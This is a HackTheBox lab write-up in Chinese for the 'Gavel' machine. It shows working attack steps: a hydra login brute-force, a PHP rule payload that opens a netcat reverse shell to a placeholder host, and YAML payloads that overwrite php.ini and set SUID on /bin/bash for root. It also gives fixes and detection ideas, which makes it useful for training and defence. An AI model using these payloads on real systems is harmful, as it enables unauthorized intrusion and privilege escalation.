## 0. Meta
- Date: 2025-11-30
- Difficulty: Medium
- Platform: HTB
- Tags: `git-leak` `code-review` `rce` `runkit` `yaml` `privesc`
- Time cost: foothold ~2h / privesc ~1h / writeup ~1h

## 1. One-line Summary
Web 站点泄露 `.git` → 还原源码后发现 **admin 可编辑的规则字符串会被 `runkit` 当作 PHP 执行** → 获取/猜解 `auctioneer` 管理员凭据后注入规则拿到 `www-data` → 复用口令 `su` 到 `auctioneer` → 利用 `gavel-util submit` 解析 YAML 并执行内嵌 PHP 的逻辑，分两步覆盖 `php.ini` 解除限制后给 `/bin/bash` 加 SUID，最终 root。

## 2. Attack Chain (5-8 steps)
1) `nmap` 确认 `80/22`，访问站点发现登录/注册与重定向域名。  
2) 目录枚举发现 `/.git/HEAD` 可直接访问 → dump `.git` 还原完整源码。  
3) 代码审计定位：`admin` 面板可写入 `auctions.rule`，出价时会通过 `runkit_function_add` 动态创建并执行规则函数 → **管理员到 RCE**。  
4) 获取 `auctioneer` 凭据（本解使用爆破得到明文口令）。  
5) 登录 `admin.php` 注入规则为反弹 shell，并通过普通用户出价触发执行 → 拿到 `www-data`。  
6) 发现口令复用：`su auctioneer` 成功 → 拿到用户权限与 `user.txt`。  
7) `auctioneer` 属于 `gavel-seller` 组，找到组可执行程序 `/usr/local/bin/gavel-util`。  
8) `gavel-util submit <yaml>` 在受限 PHP 环境下执行 YAML 的 `rule`（PHP 代码）：先用 `file_put_contents` 覆盖 `php.ini` 清空限制，再提交第二份 YAML 调用 `system("chmod u+s /bin/bash")` → `/bin/bash -p` root。

## 3. Foothold
### 3.1 Recon (only key pivots)
- What mattered:
  - `80/tcp` 重定向到虚拟主机（需要加 hosts：`gavel.htb`）。
  - 目录扫描命中 `/.git/HEAD`（关键突破口）。
- What I ignored:
  - 子域名爆破（无结果）。

Key commands:
```bash
nmap -p1-10000 -T4 -sV -sC <HTB-IP>
gobuster dir -u http://gavel.htb/ -w /usr/share/wordlists/dirb/common.txt
```

### 3.2 Exploit / Abuse
- Hypothesis:
  - `.git` 泄露可直接还原源码 → 用代码审计找可利用链路，而不是在黑盒里硬撞。
- Proof (key evidence):
  - `/.git/HEAD` 返回 200。
- Commands / Payload (minimal):
  - 使用 `git-dumper` 下载 `.git` 并还原工作区，然后在源码中定位 `admin` 写规则、出价触发规则执行的逻辑。

管理员凭据获取（本解走口令爆破，用户名来自页面可见信息）：
```bash
hydra -l auctioneer -P /usr/share/wordlists/rockyou.txt gavel.htb \
  http-post-form "/login.php:username=^USER^&password=^PASS^:S=Location" -V
```

### 3.3 Stabilize & Access
- Credential / Session / Persistence (if any):
  - 登录 `admin.php` 后，在规则编辑处写入反弹 shell（替换为你的回连 IP/端口），再用普通用户在竞价页面触发：

```php
system('mknod backpipe p && nc <LHOST> <LPORT> 0<backpipe | /bin/bash 1>backpipe');return true;
```

监听：
```bash
nc -lvnp <LPORT>
```

## 4. Privilege Escalation
- Path chosen:
  - `www-data` → `su auctioneer`（口令复用）→ `gavel-util`（YAML + PHP rule 执行）→ root。
- Why it worked:
  - `gavel-util` 允许提交 YAML，且 `rule` 字段会被当作 PHP 逻辑执行；即使有 `php.ini` 限制，也仍保留了 `file_put_contents` 等关键能力，能先“改配置”再“执行命令”。
- Key evidence:
  - `/opt/gavel/sample.yaml` 显示 `rule: "return (...)"` 是 PHP 表达式。
  - `/opt/gavel/.config/php/php.ini` 设置了 `open_basedir` 与 `disable_functions`。

两阶段 payload（最小化版）：
1) 覆盖 `php.ini` 清空限制（用仍可用的 `file_put_contents`）：
```yaml
name: A033
description: A033
image: "http://A033"
price: 4033
rule_msg: "A033"
rule: |
  file_put_contents('/opt/gavel/.config/php/php.ini',
  "engine=On\ndisplay_errors=On\nopen_basedir=/\ndisable_functions=\n");
  return false;
```

2) 第二次提交执行提权命令：
```yaml
name: A033
description: A033
image: "http://A033"
price: 4033
rule_msg: "A033"
rule: |
  system("chmod u+s /bin/bash");
  return false;
```

触发与拿 root：
```bash
gavel-util submit ini.yaml
gavel-util submit root.yaml
/bin/bash -p
id
```

## 5. Verification & Troubleshooting
- Failure case I hit:
  - `admin.php` 访问 302/跳转（通常是未登录或虚拟主机没配对）。
- How I fixed it:
  - 确认 `gavel.htb` host 解析正确；先登录再访问管理面板。
  - 规则触发依赖“出价动作”，如果没有回连：检查监听端口、防火墙、以及规则是否被正确保存到对应 auction。

## 6. Reusable Checklist (for same class)
- [ ] 目录枚举时优先关注 `/.git/`, `/.env`, 备份文件与源码泄露
- [ ] 拿到源码后，先搜“动态执行”：`eval`, `assert`, `preg_replace /e`, `create_function`, `runkit_*`
- [ ] “规则/脚本存 DB”一律按高危处理：确认谁能写、何时执行、执行权限是什么
- [ ] 发现自定义工具/二进制：看输入格式（YAML/JSON）与解析器，尤其是是否支持表达式/脚本
- [ ] 受限运行时（`php.ini`, sandbox）常能被“先写配置/文件”绕过，注意两阶段利用

## 7. Audit Mapping (if this were code)
- Where would I look in code:
  - `admin.php`（规则写入点）、`includes/bid_handler.php`（规则执行点）
  - `/usr/local/bin/gavel-util` 相关逻辑与 `/opt/gavel` 运行目录
- What pattern indicates the bug:
  - 将外部可控字符串（DB/YAML）当作代码执行（`runkit_function_add`/动态函数体）
  - “以为禁了 `system` 就安全”，但仍允许写关键配置/关键文件
- Minimal fix:
  - Web 规则引擎：用结构化 DSL（例如 YAML 仅允许 `type/value`）+ 白名单解释执行；彻底移除 runkit
  - `gavel-util`：禁止 YAML 内嵌 PHP；或至少在不可写、不可被用户影响的配置下运行；用最小权限用户执行
- Retest criteria:
  - 规则更新后，任意输入都不会触发 PHP 解释执行
  - `gavel-util submit` 无法修改 `php.ini`/无法影响可执行文件权限/无法让 `/bin/bash` 变 SUID

## 8. Detection Mapping (blue-team)
- Log points:
  - Web：访问 `/.git/HEAD`、大量字典爆破登录接口、`admin.php` 规则更新操作、异常出价触发频率
  - Host：`/opt/gavel/.config/php/php.ini` 内容变更、`/bin/bash` 权限位变化（SUID）、异常 `nc` 出站连接
- Alert ideas (high signal):
  - 匹配 `/.git/` 访问 + 之后短时间内出现 admin 面板写规则行为
  - 监控 SUID 位被设置（尤其是系统二进制如 `/bin/bash`）

## 9. Notes
- What I learned:
  - “规则即代码”如果落到数据库/可编辑后台，本质是把 RCE 交给管理员权限；在真实企业场景同样常见。
  - Sandbox/禁函数不是终点：只要还能写关键配置或关键文件，就可能两步绕过。
- What I’d do faster next time:
  - 先抓“源码泄露/配置泄露”这种高收益入口，再做代码审计定位最短利用链。